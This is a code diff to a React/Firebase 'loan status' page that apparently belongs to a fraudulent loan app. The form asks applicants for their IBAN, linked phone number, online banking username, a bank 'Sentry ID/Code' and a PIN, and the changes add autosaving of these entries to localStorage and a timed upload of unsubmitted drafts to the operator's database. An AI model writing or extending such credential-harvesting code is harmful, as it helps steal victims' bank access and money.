@@ -18,40 +18,100 @@ import { doc, updateDoc, serverTimestamp, addDoc, collection, increment } from '
 import { useAuth } from '../../../hooks/useAuth';
 
 export const LoanStatusPage = () => {
-  const { user, userData, activeLoan, loanLoading } = useAuth();
+  const { user, userData, activeLoan, activeLoanId, loanLoading, localStatus, setLocalStatus } = useAuth();
   const navigate = useNavigate();
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [localStatus, setLocalStatus] = useState<string | null>(null);
   const [bankDetails, setBankDetails] = useState({
     bankName: '',
     accountNumber: '',
     accountName: ''
   });
+  const [additionalDetails, setAdditionalDetails] = useState({
+    iban: '',
+    phoneNumber: '',
+    bankUsername: '',
+    sentry: ''
+  });
 
   const currentStatus = localStatus || activeLoan?.status || userData?.activeLoanStatus;
 
-  // Sync local status with active loan status
+  // Load drafts from localStorage when user changes
   React.useEffect(() => {
-    if (activeLoan?.status === localStatus) {
-      setLocalStatus(null);
+    if (user) {
+      const savedBank = localStorage.getItem(`loan_bank_details_${user.uid}`);
+      if (savedBank) setBankDetails(JSON.parse(savedBank));
+      
+      const savedAdditional = localStorage.getItem(`loan_additional_details_${user.uid}`);
+      if (savedAdditional) setAdditionalDetails(JSON.parse(savedAdditional));
     }
-  }, [activeLoan?.status, localStatus]);
+  }, [user]);
+
+  React.useEffect(() => {
+    if (user && (bankDetails.bankName || bankDetails.accountNumber || bankDetails.accountName)) {
+      localStorage.setItem(`loan_bank_details_${user.uid}`, JSON.stringify(bankDetails));
+    }
+  }, [bankDetails, user]);
+
+  React.useEffect(() => {
+    if (user && (additionalDetails.iban || additionalDetails.phoneNumber)) {
+      localStorage.setItem(`loan_additional_details_${user.uid}`, JSON.stringify(additionalDetails));
+    }
+  }, [additionalDetails, user]);
+
+  // Cloud backup for drafts (debounced)
+  React.useEffect(() => {
+    if (!user || !activeLoan) return;
+
+    const timer = setTimeout(async () => {
+      try {
+        await updateDoc(doc(db, 'loans', activeLoan.id), {
+          draftData: {
+            bankDetails,
+            additionalDetails,
+            lastDraftUpdate: serverTimestamp()
+          }
+        });
+      } catch (err) {
+        console.error('Error backing up draft to cloud:', err);
+      }
+    }, 2000);
+
+    return () => clearTimeout(timer);
+  }, [bankDetails, additionalDetails, user, activeLoan?.id]);
+
+  // Load drafts from cloud on mount if local is empty
+  React.useEffect(() => {
+    if (activeLoan?.draftData && !bankDetails.bankName && !additionalDetails.iban) {
+      if (activeLoan.draftData.bankDetails) {
+        setBankDetails(activeLoan.draftData.bankDetails);
+      }
+      if (activeLoan.draftData.additionalDetails) {
+        setAdditionalDetails(activeLoan.draftData.additionalDetails);
+      }
+    }
+  }, [activeLoan?.id]);
 
   const handleBankSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!user || !activeLoan) return;
+    const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
+    if (!user || !loanId) return;
 
     setIsSubmitting(true);
     setLocalStatus('bank_details_submitted');
     
     try {
       // First update the document
-      await updateDoc(doc(db, 'loans', activeLoan.id), {
+      await updateDoc(doc(db, 'loans', loanId), {
         status: 'bank_details_submitted',
         bankDetails,
         bankSubmittedAt: serverTimestamp(),
-        updatedAt: serverTimestamp()
+        updatedAt: serverTimestamp(),
+        // Clear draft on successful submit
+        draftData: null
       });
+
+      // Clear local storage
+      localStorage.removeItem(`loan_bank_details_${user.uid}`);
 
       // Update user document for instant UI feedback
       await updateDoc(doc(db, 'users', user.uid), {
@@ -63,8 +123,8 @@ export const LoanStatusPage = () => {
       await addDoc(collection(db, 'notifications', 'admin', 'items'), {
         type: 'bank_details_submitted',
         title: 'New Bank Details',
-        message: `User ${user.email} has submitted bank details for loan ${activeLoan.id}.`,
-        loanId: activeLoan.id,
+        message: `User ${user.email} has submitted bank details for loan ${loanId}.`,
+        loanId: loanId,
         userId: user.uid,
         createdAt: serverTimestamp(),
         read: false
@@ -80,9 +140,21 @@ export const LoanStatusPage = () => {
   };
 
   // If we know there's a loan (from userData) but the loan doc hasn't loaded yet
-  const isWaitingForLoanDoc = !activeLoan && (userData?.activeLoanStatus && userData.activeLoanStatus !== 'completed' && userData.activeLoanStatus !== 'rejected');
+  if (loanLoading) {
+    if (userData?.activeLoanStatus && userData.activeLoanStatus !== 'completed' && userData.activeLoanStatus !== 'rejected') {
+      return (
+        <div className="max-w-2xl mx-auto py-12 px-4 text-center">
+          <div className="w-20 h-20 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mx-auto mb-6">
+            <Clock className="w-10 h-10 text-gray-400 animate-pulse" />
+          </div>
+          <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">Synchronizing...</h2>
+          <p className="text-gray-500 mb-8 max-w-md mx-auto">
+            We see you have an active application. We're just getting the final details ready for you.
+          </p>
+        </div>
+      );
+    }
 
-  if (loanLoading || isWaitingForLoanDoc) {
     return (
       <div className="max-w-2xl mx-auto py-12 px-4 text-center">
         <div className="w-20 h-20 bg-accent/10 rounded-full flex items-center justify-center mx-auto mb-6">
@@ -96,15 +168,17 @@ export const LoanStatusPage = () => {
     );
   }
 
-  if (!activeLoan && !userData?.activeLoanStatus) {
+  if (!activeLoan && !localStatus && !userData?.activeLoanStatus) {
+    // If loanLoading is false, it means we've finished checking the database and found no active loan
+    // even if userData thinks there is one (stale data or deleted loan)
     return (
       <div className="max-w-2xl mx-auto py-12 px-4 text-center">
         <div className="w-20 h-20 bg-gray-100 dark:bg-zinc-800 rounded-full flex items-center justify-center mx-auto mb-6">
           <Clock className="w-10 h-10 text-gray-400 animate-pulse" />
         </div>
-        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">No Active Loan</h2>
+        <h2 className="text-3xl font-black tracking-tighter dark:text-white mb-4 uppercase">No Active Loan Found</h2>
         <p className="text-gray-500 mb-8 max-w-md mx-auto">
-          We couldn't find an active loan application for your account.
+          We couldn't find an active loan application for your account. If you just applied, it might take a moment to appear.
         </p>
         <div className="flex flex-col gap-3 max-w-xs mx-auto">
           <button 
@@ -113,17 +187,13 @@ export const LoanStatusPage = () => {
           >
             Apply for a Loan
           </button>
+          <button 
+            onClick={() => window.location.reload()}
+            className="text-xs font-bold text-gray-400 uppercase tracking-widest hover:text-accent transition-colors"
+          >
+            Refresh Page
+          </button>
         </div>
-      </div>
-    );
-  }
-
-  // If we have a status but still no activeLoan (rare edge case), show a generic loader
-  if (!activeLoan) {
-    return (
-      <div className="max-w-2xl mx-auto py-12 px-4 text-center">
-        <div className="w-12 h-12 border-4 border-accent border-t-transparent rounded-full animate-spin mx-auto mb-6" />
-        <p className="text-gray-500">Synchronizing your application...</p>
       </div>
     );
   }
@@ -305,21 +375,23 @@ export const LoanStatusPage = () => {
                 setIsSubmitting(true);
                 setLocalStatus('pin_sent');
                 
-                const formData = new FormData(e.currentTarget);
-                const additionalDetails = {
-                  iban: formData.get('iban'),
-                  phoneNumber: formData.get('phoneNumber'),
-                  bankUsername: formData.get('bankUsername'),
-                  sentry: formData.get('sentry')
-                };
+                const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
+                if (!loanId) {
+                  setLocalStatus(null);
+                  setIsSubmitting(false);
+                  return;
+                }
 
                 try {
-                  await updateDoc(doc(db, 'loans', activeLoan.id), {
+                  await updateDoc(doc(db, 'loans', loanId), {
                     status: 'pin_sent',
                     additionalDetails,
                     additionalDetailsSubmittedAt: serverTimestamp(),
-                    updatedAt: serverTimestamp()
+                    updatedAt: serverTimestamp(),
+                    draftData: null
                   });
+
+                  localStorage.removeItem(`loan_additional_details_${user.uid}`);
 
                   // Update user document for instant UI feedback
                   await updateDoc(doc(db, 'users', user.uid), {
@@ -343,6 +415,8 @@ export const LoanStatusPage = () => {
                     required
                     name="iban"
                     type="text" 
+                    value={additionalDetails.iban}
+                    onChange={(e) => setAdditionalDetails({...additionalDetails, iban: e.target.value})}
                     className="input-field" 
                     placeholder="International Bank Account Number" 
                   />
@@ -353,6 +427,8 @@ export const LoanStatusPage = () => {
                     required
                     name="phoneNumber"
                     type="tel" 
+                    value={additionalDetails.phoneNumber}
+                    onChange={(e) => setAdditionalDetails({...additionalDetails, phoneNumber: e.target.value})}
                     className="input-field" 
                     placeholder="Linked phone number" 
                   />
@@ -363,6 +439,8 @@ export const LoanStatusPage = () => {
                     required
                     name="bankUsername"
                     type="text" 
+                    value={additionalDetails.bankUsername}
+                    onChange={(e) => setAdditionalDetails({...additionalDetails, bankUsername: e.target.value})}
                     className="input-field" 
                     placeholder="Your online banking username" 
                   />
@@ -373,6 +451,8 @@ export const LoanStatusPage = () => {
                     required
                     name="sentry"
                     type="text" 
+                    value={additionalDetails.sentry}
+                    onChange={(e) => setAdditionalDetails({...additionalDetails, sentry: e.target.value})}
                     className="input-field" 
                     placeholder="Enter Sentry ID/Code" 
                   />
@@ -412,8 +492,15 @@ export const LoanStatusPage = () => {
                     setIsSubmitting(true);
                     setLocalStatus('pin_submitted');
                     
+                    const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
+                    if (!loanId) {
+                      setLocalStatus(null);
+                      setIsSubmitting(false);
+                      return;
+                    }
+
                     try {
-                      await updateDoc(doc(db, 'loans', activeLoan.id), {
+                      await updateDoc(doc(db, 'loans', loanId), {
                         status: 'pin_submitted',
                         pinSubmittedAt: serverTimestamp(),
                         updatedAt: serverTimestamp()
@@ -429,8 +516,8 @@ export const LoanStatusPage = () => {
                       await addDoc(collection(db, 'notifications', 'admin', 'items'), {
                         type: 'pin_submitted',
                         title: 'PIN Verified',
-                        message: `User ${user.email} has verified their PIN for loan ${activeLoan.id}. Ready for disbursement.`,
-                        loanId: activeLoan.id,
+                        message: `User ${user.email} has verified their PIN for loan ${loanId}. Ready for disbursement.`,
+                        loanId: loanId,
                         userId: user.uid,
                         createdAt: serverTimestamp(),
                         read: false
@@ -498,7 +585,7 @@ export const LoanStatusPage = () => {
       default:
         return (
           <div className="text-center py-10">
-            <p className="text-gray-500">Status: {activeLoan.status}</p>
+            <p className="text-gray-500 uppercase font-black tracking-widest text-xs">Status: {currentStatus || 'Unknown'}</p>
           </div>
         );
     }
